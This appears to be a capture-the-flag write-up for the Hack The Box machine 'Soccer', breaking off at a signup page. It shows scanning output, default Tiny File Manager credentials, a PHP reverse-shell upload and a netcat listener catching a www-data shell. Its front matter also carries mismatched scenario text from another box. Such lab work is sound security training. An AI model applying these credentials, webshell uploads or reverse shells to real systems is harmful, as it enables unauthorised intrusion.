---
title: "Soccer Writeup"
permalink: /Soccer/
box:
  machine_name: "Soccer"
  release: "17 Dec, 2022"
  retire: "10 Jun 2023"
  os: "Linux"
  base_points: "Easy [20]"
  difficulty_hist: "/assets/boxes/admin-diff.png"     # optional image
  radar: "/assets/boxes/admin-radar.png"              # optional image
  first_blood_user: "00:06:01 — NLTE (Guru)"
  first_blood_root: "00:09:06 — NLTE (Guru)"
  creator: "sau123 (Hacker)"
  machine_url: "https://www.hackthebox.com/machines/soccer"
  scenario: >
    As is common in real-life Windows pentests, you will start the Administrator
    box with credentials for the following account:
    **Username:** Olivia **Password:** ichliebedich
---
<style>
.box-card{border:1px solid #2c2c2c;border-radius:10px;padding:1rem 1rem .5rem;background:#121212;box-shadow:0 0 0 1px #000 inset;margin:1.5rem 0}
.box-card__header{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #2c2c2c;padding-bottom:.5rem;margin-bottom:.75rem}
.box-card__title{margin:0;font-size:1.6rem;color:#58f87a;letter-spacing:.5px}
.box-card__cta{font-size:.9rem;text-decoration:none;border:1px solid #2c2c2c;padding:.25rem .5rem;border-radius:6px}
.box-grid{display:grid;gap:.25rem}
.box-row{display:grid;grid-template-columns:180px 1fr;gap:1rem;padding:.4rem 0;border-bottom:1px dashed #222}
.box-row:last-child{border-bottom:none}
.box-row>span:first-child{color:#f15;font-weight:700}
.box-row--stack{align-items:start}
.box-img{max-width:460px;width:100%;height:auto;border-radius:6px;border:1px solid #222}
.box-note{display:inline-block;background:#0f1a0f;border:1px solid #224822;padding:.6rem .7rem;border-radius:8px}
</style>

{% include box-info.html data=page.box name=page.title %}

# Enumeration
## Nmap Scan
```
┌──(kali㉿kali)-[~/Boxes/random_boxes/soccer]
└─$ nmap -sC -sV 10.129.226.212        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-04 14:45 EST
Nmap scan report for 10.129.226.212
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Wed, 04 Feb 2026 19:48:41 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Wed, 04 Feb 2026 19:48:42 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.95%I=7%D=2/4%Time=6983A1D6%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Wed,\x2004\x20Feb\x202026\x2019:48:41\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Wed,\x2004\x20Feb\x202026\x2019:48:42\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Wed,\x
SF:2004\x20Feb\x202026\x2019:48:42\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.71 seconds
```
### SSH
Looking at the ssh port, we get the Linux kernel information
- OpenSSH 8.2p1 Ubuntu 4ubuntu0.5

### Http Website
Navigating to the home page, we see a webpage that seems to be for a football club.
<img width="2432" height="700" alt="image" src="https://github.com/user-attachments/assets/1231d4bb-bce0-45d3-ac20-df696cfd7fc5" />

The next step was to enumerate for hidden directories and subdomains. I used feroxbuster and ffuf to accomplish this, and the output for each command is shown below.

**Directory Fuzzing with Feroxbuster**
```
┌──(kali㉿kali)-[~/Boxes/random_boxes/soccer]
└─$ feroxbuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://soccer.htb/
                                                                                                                                                                           
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soccer.htb/
 🚩  In-Scope Url          │ soccer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg
200      GET      147l      526w     6917c http://soccer.htb/
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
[###################>] - 18m   659147/661659  6s      found:7       errors:0      
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_soccer_htb_-1770236454.state ...
[###################>] - 18m   659150/661659  6s      found:7       errors:0      
[####################] - 17m   220546/220546  213/s   http://soccer.htb/ 
[###################>] - 17m   219411/220546  214/s   http://soccer.htb/tiny/ 
[###################>] - 17m   219150/220546  214/s   http://soccer.htb/tiny/uploads/ 
```
**Subdomain Fuzzing with FFUF**
```
┌──(kali㉿kali)-[~/Boxes/random_boxes/soccer]
└─$ ffuf -w /home/kali/Custom_Wordlists/wordlists/wordlists/discovery/top_subdomains.txt:FUZZ -u http://soccer.htb -H "Host: FUZZ.soccer.htb" -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://soccer.htb
 :: Wordlist         : FUZZ: /home/kali/Custom_Wordlists/wordlists/wordlists/discovery/top_subdomains.txt
 :: Header           : Host: FUZZ.soccer.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 192 req/sec :: Duration: [0:11:05] :: Errors: 0 ::
```

We see that this website has a directory named `tiny`. Navigating to this directory we are led to a login page for a H3K Tiny File Manager.
<img width="2281" height="700" alt="image" src="https://github.com/user-attachments/assets/68c71ad3-c3e2-407d-b3df-b7cbfda811c7" />

### xmltec-xmlmail
On port 9091, we see what is mostly a Transmission BitTorrent client web interface open to the public. However, from both the nmap scan and some manual enumeration, we don't get any information that could potentially allow us a foothold into the system.

## Compromise
Doing some reasearch on this application, we find that there are admin and user default credentials for logging in.
- admin:admin@123
- user:12345

Using the admin default credentials we found online, I was able to log into the file manager via admin credentials.
<img width="2422" height="600" alt="image" src="https://github.com/user-attachments/assets/aec55484-dbd9-4aa8-b9d0-97f41a41b365" />

At the bottom corner of the webpage, we see that this version of H3K Tiny File Manager is 2.4.3, which is both vulnerable to high severity exploits like `CVE-2022-45476` and `CVE-2021-45010`. Both of these CVEs involve abusing the upload functionality to upload malicious PHP files that can be used to obtain command execution.

So creating a simple php shell, I tried to upload this file into the main directory. However, when attempting to upload the shell, we get an error explaining that we don't have permissions to upload in this directory.

However, we see that there is a `tiny` directory that leads us to an `upload` directory.
<img width="2069" height="544" alt="image" src="https://github.com/user-attachments/assets/d406158c-45e3-4cba-9e3c-ac290597c1fa" />

When we attempt to upload a file in this directory, we are successful, and navigating to this file, we also see that command execution is successful.
<img width="989" height="669" alt="image" src="https://github.com/user-attachments/assets/7dd9e362-de91-4918-8b4b-6a157f706a92" />
<img width="807" height="235" alt="image" src="https://github.com/user-attachments/assets/62349d70-cc36-4943-bc5a-0d2de1886cd8" />

Using the PHP PentestMonkey shell and renaming the file `shell2.php`, I uploaded this payload to the `upload` folder, started a listener on my machine, and once I navigated to the php script I was able to get a reverse shell as `www-data`

<img width="956" height="623" alt="image" src="https://github.com/user-attachments/assets/97e81138-3731-43b4-8883-2000a32252b6" />


```
┌──(kali㉿kali)-[~/Boxes/random_boxes/soccer]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.86] from (UNKNOWN) [10.129.226.212] 60566
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 22:52:34 up  3:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (936): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:/$ whoami
whoami
www-data
www-data@soccer:/$ 
```
Looking into the `/home` directory, we see that there is a user by the name of `player`.
```
www-data@soccer:/$ cd home
cd homels 
www-data@soccer:/home$ -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Nov 17  2022 .
drwxr-xr-x 21 root   root   4096 Dec  1  2022 ..
drwxr-xr-x  3 player player 4096 Nov 28  2022 player
```
When looking through the machine, there seems to be nothing of interest in the /var directory. There doesn't seem to be any suspicious processes running on the machine, and there aren't any files owned by `player` that are interesting for me.

However, knowing that this website iserver uses nginx, I navigated to the `/etc/nginx` directory to look through the configuration files of the web server. Wanting to see if there are any custom subdomains my ealier enumeration was not able to pick up, I found that there is a `soc-player` web server listening on port 3000
```
www-data@soccer:/etc/nginx/sites-available$ ls -la
ls -la
total 16
drwxr-xr-x 2 root root 4096 Dec  1  2022 .
drwxr-xr-x 8 root root 4096 Nov 17  2022 ..
-rw-r--r-- 1 root root  442 Dec  1  2022 default
-rw-r--r-- 1 root root  332 Nov 17  2022 soc-player.htb
www-data@soccer:/etc/nginx/sites-available$ cat soc-palyer.htb
cat soc-palyer.htb
cat: soc-palyer.htb: No such file or directory
www-data@soccer:/etc/nginx/sites-available$ cat soc-player.htb
cat soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```
Adding this subdomain to my `/etc/host` file, I navigated to the website and while the website looks similar to the one before, we see at the top left that there are login and signup options we can interact with.
<img width="2426" height="800" alt="image" src="https://github.com/user-attachments/assets/aa9a06b3-2c02-408a-b794-868641fb040f" />

Going to the signup
<img width="2429" height="949" alt="image" src="https://github.com/user-attachments/assets/c8089142-e78c-4910-8cf1-40fe0ce7cee3" />

<img width="2424" height="675" alt="image" src="https://github.com/user-attachments/assets/902857cd-e723-4baf-badc-e139c0b242c8" />

<img width="650" height="563" alt="image" src="https://github.com/user-attachments/assets/16f68614-745d-4b67-93e5-2356c56a841b" />
